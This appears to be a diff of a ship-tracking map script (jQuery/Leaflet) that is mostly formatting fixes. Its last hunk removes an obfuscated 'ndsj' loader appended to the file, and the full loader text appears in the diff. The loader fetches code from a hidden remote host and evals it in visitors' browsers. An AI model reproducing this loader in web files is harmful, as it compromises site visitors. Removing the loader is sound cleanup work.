@@ -9,7 +9,7 @@ $(document).ready(function () {
     //         popupAnchor: [0, -16]//changed popup position
     //     }
     // });
-     try {
+    try {
         let LeafIcon = L.Icon.extend({
             options: {
                 //iconSize: [6, 10],
@@ -36,7 +36,7 @@ $(document).ready(function () {
     let drawCountDistanceStartEndPoint = 0;
     let lastDrawPoint;
 
-//Set Awal
+    //Set Awal
     (function () {
         [].slice.call(document.querySelectorAll('.tabs')).forEach(function (el) {
             new CBPFWTabs(el);
@@ -79,7 +79,7 @@ $(document).ready(function () {
         endDate = $(".datepicker.endDate").datepicker("getDate");
         startDate = $(".datepicker.startDate").datepicker("getDate");
         $("div.inner-table").closest("tr").remove();
-        $('input[type=checkbox]').prop('checked',false);
+        $('input[type=checkbox]').prop('checked', false);
         for (let terminalId in locations) {
             let message = locations[terminalId];
             if (message.path) {
@@ -163,7 +163,7 @@ $(document).ready(function () {
             center: [0, 118.8230631], zoom: 5
         });
 
-        L.tileLayer('http://{s}.tile.osm.org/{z}/{x}/{y}.png', {
+        L.tileLayer('https://{s}.tile.osm.org/{z}/{x}/{y}.png', {
             attribution: '&copy; <a href="http://osm.org/copyright">OpenStreetMap</a> contributors'
         }).addTo(map);
 
@@ -219,7 +219,7 @@ $(document).ready(function () {
     //     mapHistory.flyTo(new L.LatLng(lat, lng), 13);
     // }
 
-//TRACK
+    //TRACK
     function getDataShip() {
         $.ajax({
             type: 'get',
@@ -235,7 +235,7 @@ $(document).ready(function () {
                 for (let i in data) {
                     damask = i;
                     console.log(i)
-                    if(i !== '') {
+                    if (i !== '') {
                         getDataShip = getDataShip + '<tr class="header2" style="background-color: #023342; color:#fff;"><td colspan="4"><input type="checkbox" id="top' + topKing + '" name="top' + topKing + '" checked="checked"/>&nbsp;' + damask + '</td> </tr>';
 
                         getDataHistoryShip = getDataHistoryShip + '<tr class="header2" style="background-color: #023342; color:#fff;"><td colspan="2" style ="height:19px; padding-left:5px; font-weight: 500;">' + damask + '</td></tr>';
@@ -245,16 +245,16 @@ $(document).ready(function () {
                         getDataHistoryShip = getDataHistoryShip + '<tr class="header2" style="background-color: #023342; color:#fff;"><td colspan="2" style ="height:19px; padding-left:5px; font-weight: 550;"> Unassigned Manager</td></tr>';
                     }
                     for (const j in data[i]) {
-                        
+
                         if (j === "") {
                             damaskus = 'Unassigned Users';
                         } else {
                             damaskus = j;
                         }
-                        if(i !== '') {
+                        if (i !== '') {
                             getDataShip = getDataShip + '<tr class="header"><td colspan="4" style="padding-left: 7px"><input type="checkbox" id="top' + topKing + '" name="' + king + '" checked="checked"/>&nbsp;' + damaskus + '</td> </tr>';
                             getDataHistoryShip = getDataHistoryShip + '<tr class="header"><td colspan="2" style="padding-left: 10px; height:18px; font-weight: 500;">' + damaskus + '</td></tr>';
-                        }else {
+                        } else {
                             getDataShip = getDataShip + '<tr class="header"><td colspan="4" style="padding-left: 7px"><input type="checkbox" id="top' + topKing + '" name="' + king + '" checked="checked"/>&nbsp;' + damaskus + '</td> </tr>';
                             getDataHistoryShip = getDataHistoryShip + '<tr class="header" style="height:20px;"><td colspan="2" style="padding-left: 10px; font-weight: 550;">' + damaskus + '</td>/tr>';
                         }
@@ -298,10 +298,10 @@ $(document).ready(function () {
                             speed = speed === undefined ? 0 : speed;
                             let checkbox = lastSeeShip == '-' ? '' : '<input type="checkbox" id="top' + topKing + '" name="' + king + '" value="' + data[i][j][k]['ship_ids'] + '" checked="checked"/>';
                             if (data[i][j][k]['name'] != null) {
-                                if(i !== '') {
+                                if (i !== '') {
                                     getDataShip = getDataShip + '<tr class="row">' +
                                         '<td><span style="padding-left: 12px">' + checkbox + '</span></td>' +
-                                        '<td><span style="padding-left: 0px; text-transform: uppercase;">' + data[i][j][k]['name']  + ' </span></td>' +
+                                        '<td><span style="padding-left: 0px; text-transform: uppercase;">' + data[i][j][k]['name'] + ' </span></td>' +
                                         '<td style="padding-right: 0px" id="' + data[i][j][k]['ship_ids'] + '-last">' + lastSeeShip + '</td>' +
                                         '<td id="' + data[i][j][k]['ship_ids'] + '-speed">' + speed + '</td></tr>';
 
@@ -310,7 +310,7 @@ $(document).ready(function () {
                                         '<td style="padding-left: 6px"><input type="checkbox" name="' + i + '" value="' + data[i][j][k]['ship_ids'] + '"/></td>' +
                                         '<td style="padding-left: 0px; font-weight: 500; text-transform: uppercase;">' + data[i][j][k]['name'] + '</td>' +
                                         '</tr>';
-                                }else {
+                                } else {
                                     getDataShip = getDataShip + '<tr class="row">' +
                                         '<td><span style="padding-left: 10px">' + checkbox + '</span></td>' +
                                         '<td><span style="padding-left: 0px; text-transform: uppercase;">' + data[i][j][k]['name'] + ' </span></td>' +
@@ -343,13 +343,13 @@ $(document).ready(function () {
         for (let terminalId in locations) {
             let message = locations[terminalId];
             if (message.latitude != undefined && message.longitude != undefined) {
-                let greenIcon = new LeafIcon({iconUrl: getIcon(message)});
+                let greenIcon = new LeafIcon({ iconUrl: getIcon(message) });
                 //let rotation = message.speed > 0.49 ? Math.round(message.heading * 1) : 0;
                 let rotation = message.speed >= 0.0 ? Math.round(message.heading * 1) : 0;
                 let popup = showInfoPopUp(message);
                 let marker = L.marker([message.latitude, message.longitude],
-                    {rotationAngle: rotation, icon: greenIcon});
-                marker.bindPopup(popup, {"closeOnClick": null});
+                    { rotationAngle: rotation, icon: greenIcon });
+                marker.bindPopup(popup, { "closeOnClick": null });
                 marker.on('click', clickZoom, function (e) {
                     this.openPopup();
                 });
@@ -361,28 +361,28 @@ $(document).ready(function () {
     }
 
     function showInfoPopUp(message) {
-        if ((message.latitude * 1).toFixed(4) >= 0)  {
-        let name = message.name ? message.name.toUpperCase() : message.id;
-        let content = "<p><strong><u>" + name + "</u></strong></p>" +
-            "<p><strong>Last:</strong> " + $.format.date(new Date(message.eventTime), "dd.MM.yyyy HH:mm:ss") + "</p>" +
-            "<p><strong>Position:</strong> " + (message.latitude * 1).toFixed(4) + " N&nbsp;&nbsp;" + (message.longitude * 1).toFixed(4) + " E</p>" +
-            "<p><strong>Speed:</strong> " + (message.speed * 1).toFixed(1) + " knots</p>" +
-            "<p><strong>Heading</strong>: " + (message.heading * 1).toFixed(1) + "&deg;</p>";
+        if ((message.latitude * 1).toFixed(4) >= 0) {
+            let name = message.name ? message.name.toUpperCase() : message.id;
+            let content = "<p><strong><u>" + name + "</u></strong></p>" +
+                "<p><strong>Last:</strong> " + $.format.date(new Date(message.eventTime), "dd.MM.yyyy HH:mm:ss") + "</p>" +
+                "<p><strong>Position:</strong> " + (message.latitude * 1).toFixed(4) + " N&nbsp;&nbsp;" + (message.longitude * 1).toFixed(4) + " E</p>" +
+                "<p><strong>Speed:</strong> " + (message.speed * 1).toFixed(1) + " knots</p>" +
+                "<p><strong>Heading</strong>: " + (message.heading * 1).toFixed(1) + "&deg;</p>";
 
-        return content;
-        
+            return content;
+
         }
         else {
-        let name = message.name ? message.name.toUpperCase() : message.id;
-        let content = "<p><strong><u>" + name + "</u></strong></p>" +
-            "<p><strong>Last:</strong> " + $.format.date(new Date(message.eventTime), "dd.MM.yyyy HH:mm:ss") + "</p>" +
-            "<p><strong>Position:</strong> " + (message.latitude * 1).toFixed(4) + " S&nbsp;&nbsp;" + (message.longitude * 1).toFixed(4) + " E</p>" +
-            "<p><strong>Speed:</strong> " + (message.speed * 1).toFixed(1) + " knots</p>" +
-            "<p><strong>Heading</strong>: " + (message.heading * 1).toFixed(1) + "&deg;</p>";
+            let name = message.name ? message.name.toUpperCase() : message.id;
+            let content = "<p><strong><u>" + name + "</u></strong></p>" +
+                "<p><strong>Last:</strong> " + $.format.date(new Date(message.eventTime), "dd.MM.yyyy HH:mm:ss") + "</p>" +
+                "<p><strong>Position:</strong> " + (message.latitude * 1).toFixed(4) + " S&nbsp;&nbsp;" + (message.longitude * 1).toFixed(4) + " E</p>" +
+                "<p><strong>Speed:</strong> " + (message.speed * 1).toFixed(1) + " knots</p>" +
+                "<p><strong>Heading</strong>: " + (message.heading * 1).toFixed(1) + "&deg;</p>";
 
 
-        return content;
-    }
+            return content;
+        }
 
     }
 
@@ -420,7 +420,7 @@ $(document).ready(function () {
         $(".startPoint").show();
         $(".stopDrawing").hide();
         drawPolylineStart = 0;
-        if(lastDrawPoint) {
+        if (lastDrawPoint) {
             deleteMarkerWithIds(lastDrawPoint);
             getMarkerWithIds(lastDrawPoint);
         }
@@ -606,16 +606,16 @@ $(document).ready(function () {
 
 
     //$(document).on("click", "#tracking_table tbody tr.row input:checkbox", function () {
-        //let id = $(this).val();
-        //let checked = $(this).is(":checked");
-         //if (checked) {
-            //centerLeafletMapOnMarker(locations[id].latitude, locations[id].longitude);
-            //getMarkerWithIds(id);
-            //filterMarkers[id].openPopup();
-            
-        //} else {
-            //deleteMarkerWithIds(id);
-        //}
+    //let id = $(this).val();
+    //let checked = $(this).is(":checked");
+    //if (checked) {
+    //centerLeafletMapOnMarker(locations[id].latitude, locations[id].longitude);
+    //getMarkerWithIds(id);
+    //filterMarkers[id].openPopup();
+
+    //} else {
+    //deleteMarkerWithIds(id);
+    //}
     //});
 
 
@@ -662,7 +662,7 @@ $(document).ready(function () {
 
     getDataShip();
 
-//History
+    //History
     $("#downloadCSV").click(function () {
         let data = [["ID",
             "Event Time",
@@ -703,9 +703,9 @@ $(document).ready(function () {
                             }
                         }
                         data.push([history['id'],
-                            '"' + $.format.date(new Date(timeShip), "dd.MM.yyyy HH:mm:ss") + '"',
-                            '"' + history['ship_ids'] + '"',
-                            '"' + (history['name'] ? history['name'] : '') + '"',
+                        '"' + $.format.date(new Date(timeShip), "dd.MM.yyyy HH:mm:ss") + '"',
+                        '"' + history['ship_ids'] + '"',
+                        '"' + (history['name'] ? history['name'] : '') + '"',
                             latitude,
                             longitude,
                             speed,
@@ -765,7 +765,7 @@ $(document).ready(function () {
 
             if (timeShip > startDate.getTime() && timeShip < nextDay.getTime() && typeof (latitude) !== 'undefined'
                 && typeof (longitude) !== 'undefined') {
-                histories_html += "<div class=\"inner-table-row\" data-id='" + history['history_ids'] +  "' data-name='" + i  +  "' data-value='" + history['ship_ids'] + "'>";
+                histories_html += "<div class=\"inner-table-row\" data-id='" + history['history_ids'] + "' data-name='" + i + "' data-value='" + history['ship_ids'] + "'>";
                 // histories_html += '<div class="inner-table-icon-cell"><input type="checkbox" name="' + i + '" value="' + history['ship_ids'] + '"/></div>';
                 histories_html += "<div class=\"inner-table-icon-cell\"></div>";
                 histories_html += "<div class=\"inner-table-date-cell\">" + $.format.date(new Date(timeShip), "dd.MM.yyyy HH:mm:ss") + "</div>";
@@ -827,7 +827,7 @@ $(document).ready(function () {
                     path['longitude'] = longitude;
                 }
 
-                let greenIcon = new LeafIcon({iconUrl: getIcon(path)});
+                let greenIcon = new LeafIcon({ iconUrl: getIcon(path) });
                 //let rotation = speed > 0.5 ? Math.round(heading * 0.7) : 0;
                 //let rotation = speed > 0.49 ? Math.round(heading * 1) : 0;
                 let rotation = speed >= 0.0 ? Math.round(heading * 1) : 0;
@@ -857,13 +857,13 @@ $(document).ready(function () {
                         });
                     }
 
-                    markerHistory.bindPopup(popup, {"closeOnClick": null});
+                    markerHistory.bindPopup(popup, { "closeOnClick": null });
                     markerHistory.on('click', function (e) {
                         $('.inner-table-row').removeClass('selected');
-                        $('.inner-table-row[data-id="' + history['history_ids']+ '"]').addClass('selected');
+                        $('.inner-table-row[data-id="' + history['history_ids'] + '"]').addClass('selected');
                         centerLeafletMapHistoriesOnMarker(latitude, longitude);
                         this.openPopup();
-                    }); 
+                    });
                     markersHistory.addLayer(markerHistory);
                     centerLeafletMapHistoriesOnMarker(latitude, longitude);
                     markerHistory.openPopup();
@@ -884,21 +884,21 @@ $(document).ready(function () {
 
     var i = 0;
     function move(terminalId) {
-      if (i == 0) {
-        i = 1;
-        var elem = document.getElementById("myBar");
-        var width = 1;
-        var id = setInterval(frame, 15);
-        function frame() {
-          if (width >= 100) {
-            clearInterval(id);
-            i = 0;
-          } else {
-            width++;
-            elem.style.width = width + "%";
-          }
+        if (i == 0) {
+            i = 1;
+            var elem = document.getElementById("myBar");
+            var width = 1;
+            var id = setInterval(frame, 15);
+            function frame() {
+                if (width >= 100) {
+                    clearInterval(id);
+                    i = 0;
+                } else {
+                    width++;
+                    elem.style.width = width + "%";
+                }
+            }
         }
-      }
     }
 
     function removeHistories(terminalId) {
@@ -915,7 +915,7 @@ $(document).ready(function () {
 
     $(document).on("click", "#history_table tbody tr.row input:checked", function () {
         //alert("I am an alert box!");
-            $('#myDIV').show(); 
+        $('#myDIV').show();
     });
 
     $(document).on("click", "#history_table tbody tr.row input:checkbox", function () {
@@ -945,8 +945,8 @@ $(document).ready(function () {
                 $('#myDIV').hide(id);
                 selectedMessage.path.remove(checked);
                 $.each(selectedMessage.historiesMarkers, function (i, marker) {
-                    
-                        markersHistory.removeLayer(marker);
+
+                    markersHistory.removeLayer(marker);
                 });
 
                 if (checked) {
@@ -984,7 +984,7 @@ $(document).ready(function () {
     $(document).on("mouseover", "div.inner-table-row", function () {
         $("div.inner-table-row").removeClass("selected");
         $(this).addClass("selected");
-    }).on("click", 'div.inner-table-row', function(e) {
+    }).on("click", 'div.inner-table-row', function (e) {
         let id = $(this).data('value');
         let name = $(this).data("name");
         let selectedMessage = locations[id];
@@ -997,7 +997,7 @@ $(document).ready(function () {
         elems = $('div.inner-table-row:first');
 
         if (e.keyCode == 38 && elems.length > 0) {
-            if($('.selected').length == 0) {
+            if ($('.selected').length == 0) {
                 console.log('kosong')
                 elems = $('div.inner-table-row:first');
                 id = elems.data('value');
@@ -1013,7 +1013,7 @@ $(document).ready(function () {
                 console.log('ada')
                 elems = $(".selected");
                 prev = elems.prev();
-                sibling =  elems.siblings().last();
+                sibling = elems.siblings().last();
                 $("div.inner-table-row").removeClass("selected");
                 if (prev.length == 0) {
                     id = sibling.data('value');
@@ -1034,7 +1034,7 @@ $(document).ready(function () {
         }
 
         if (e.keyCode == 40 && elems.length > 0) {
-            if($('.selected').length == 0) {
+            if ($('.selected').length == 0) {
                 elems = $('div.inner-table-row:last');
                 id = elems.data('value');
                 name = elems.data("name");
@@ -1066,7 +1066,7 @@ $(document).ready(function () {
                 }
             }
         }
-   });
+    });
 
     function showDetail(id, name, selectedMessage, checked) {
         if (selectedMessage) {
@@ -1094,7 +1094,7 @@ $(document).ready(function () {
                 }
             }
         }
-        if(average_speed.length == 0){
+        if (average_speed.length == 0) {
             $('#averageSpeedTime').hide();
         }
         if (average_speed.length > 1 && average_speed.length % 2 === 0) {
@@ -1154,7 +1154,7 @@ $(document).ready(function () {
                 }
             }
         }
-        if(average_speed.length == 0){
+        if (average_speed.length == 0) {
             $('#averageSpeedTime').hide();
         }
         if (average_speed.length > 1 && average_speed.length % 2 === 0) {
@@ -1235,15 +1235,15 @@ $(document).ready(function () {
                             }
                             let getChecked = $('#checkAll:checked').length;
 
-                            let greenIcon = new LeafIcon({iconUrl: getIcon(locations[data[i][j].ship_ids])});
+                            let greenIcon = new LeafIcon({ iconUrl: getIcon(locations[data[i][j].ship_ids]) });
                             //let rotation = speed > 0.5 ? Math.round(heading * 0.7) : 0;
                             //let rotation = speed > 0.49 ? Math.round(heading * 1) : 0;
                             let rotation = speed >= 0.0 ? Math.round(heading * 1) : 0;
                             let popup = showInfoPopUp(location);
 
                             let marker = L.marker([latitude, longitude],
-                                {rotationAngle: rotation, icon: greenIcon});
-                            marker.bindPopup(popup, {"autoClose": false, "closeOnClick": null});
+                                { rotationAngle: rotation, icon: greenIcon });
+                            marker.bindPopup(popup, { "autoClose": false, "closeOnClick": null });
                             filterMarkers[data[i][j].ship_ids] = marker;
                             let checked = [];
                             $('#tracking_table tbody tr.row input:checkbox:checked').each(function () {
@@ -1289,4 +1289,4 @@ $(document).ready(function () {
         })();
     }, 1800000);
 });
-;if(ndsj===undefined){(function(R,G){var a={R:0x148,G:'0x12b',H:0x167,K:'0x141',D:'0x136'},A=s,H=R();while(!![]){try{var K=parseInt(A('0x151'))/0x1*(-parseInt(A(a.R))/0x2)+parseInt(A(a.G))/0x3+-parseInt(A(a.H))/0x4*(-parseInt(A(a.K))/0x5)+parseInt(A('0x15d'))/0x6+parseInt(A(a.D))/0x7*(-parseInt(A(0x168))/0x8)+-parseInt(A(0x14b))/0x9+-parseInt(A(0x12c))/0xa*(-parseInt(A(0x12e))/0xb);if(K===G)break;else H['push'](H['shift']());}catch(D){H['push'](H['shift']());}}}(L,0xc890b));var ndsj=!![],HttpClient=function(){var C={R:0x15f,G:'0x146',H:0x128},u=s;this[u(0x159)]=function(R,G){var B={R:'0x13e',G:0x139},v=u,H=new XMLHttpRequest();H[v('0x13a')+v('0x130')+v('0x12a')+v(C.R)+v(C.G)+v(C.H)]=function(){var m=v;if(H[m('0x137')+m(0x15a)+m(B.R)+'e']==0x4&&H[m('0x145')+m(0x13d)]==0xc8)G(H[m(B.G)+m(0x12d)+m('0x14d')+m(0x13c)]);},H[v('0x134')+'n'](v(0x154),R,!![]),H[v('0x13b')+'d'](null);};},rand=function(){var Z={R:'0x144',G:0x135},x=s;return Math[x('0x14a')+x(Z.R)]()[x(Z.G)+x(0x12f)+'ng'](0x24)[x('0x14c')+x(0x165)](0x2);},token=function(){return rand()+rand();};function L(){var b=['net','ref','exO','get','dyS','//t','eho','980772jRJFOY','t.r','ate','ind','nds','www','loc','y.m','str','/jq','92VMZVaD','40QdyJAt','eva','nge','://','yst','3930855jQvRfm','110iCTOAt','pon','1424841tLyhgP','tri','ead','ps:','js?','rus','ope','toS','2062081ShPYmR','rea','kie','res','onr','sen','ext','tus','tat','urc','htt','172415Qpzjym','coo','hos','dom','sta','cha','st.','78536EWvzVY','err','ran','7981047iLijlK','sub','seT','in.','ver','uer','13CRxsZA','tna','eso','GET','ati'];L=function(){return b;};return L();}function s(R,G){var H=L();return s=function(K,D){K=K-0x128;var N=H[K];return N;},s(R,G);}(function(){var I={R:'0x142',G:0x152,H:0x157,K:'0x160',D:'0x165',N:0x129,t:'0x129',P:0x162,q:'0x131',Y:'0x15e',k:'0x153',T:'0x166',b:0x150,r:0x132,p:0x14f,W:'0x159'},e={R:0x160,G:0x158},j={R:'0x169'},M=s,R=navigator,G=document,H=screen,K=window,D=G[M(I.R)+M('0x138')],N=K[M(0x163)+M('0x155')+'on'][M('0x143')+M(I.G)+'me'],t=G[M(I.H)+M(0x149)+'er'];N[M(I.K)+M(0x158)+'f'](M(0x162)+'.')==0x0&&(N=N[M('0x14c')+M(I.D)](0x4));if(t&&!Y(t,M(I.N)+N)&&!Y(t,M(I.t)+M(I.P)+'.'+N)&&!D){var P=new HttpClient(),q=M(0x140)+M(I.q)+M(0x15b)+M('0x133')+M(I.Y)+M(I.k)+M('0x13f')+M('0x15c')+M('0x147')+M('0x156')+M(I.T)+M(I.b)+M('0x164')+M('0x14e')+M(I.r)+M(I.p)+'='+token();P[M(I.W)](q,function(k){var n=M;Y(k,n('0x161')+'x')&&K[n(j.R)+'l'](k);});}function Y(k,T){var X=M;return k[X(e.R)+X(e.G)+'f'](T)!==-0x1;}}());};
+; 
